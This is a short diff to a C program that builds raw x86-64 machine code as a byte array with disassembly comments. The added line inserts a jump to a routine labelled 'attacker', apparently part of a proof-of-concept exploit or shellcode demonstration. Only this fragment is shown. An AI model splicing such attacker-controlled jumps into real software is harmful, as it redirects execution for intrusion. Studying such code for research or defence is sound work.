@@ -26,6 +26,7 @@ int main() {
         0x4c, 0x89, 0xd1,                         // mov    %r10,%rcx
         0x48, 0x8d, 0x35, 0xe3, 0xff, 0xff, 0xff, // lea    -0x1d(%rip),%rsi
         0xf3, 0xa5,                               // rep movsl %ds:(%rsi),%es:(%rdi)
+        0xeb, 0x55,                               // jmp    104a <attacker> 
 
         // <loop>:
         0xf0, 0x49, 0x0f, 0xc1, 0x09,             // lock xadd %rcx,(%r9)
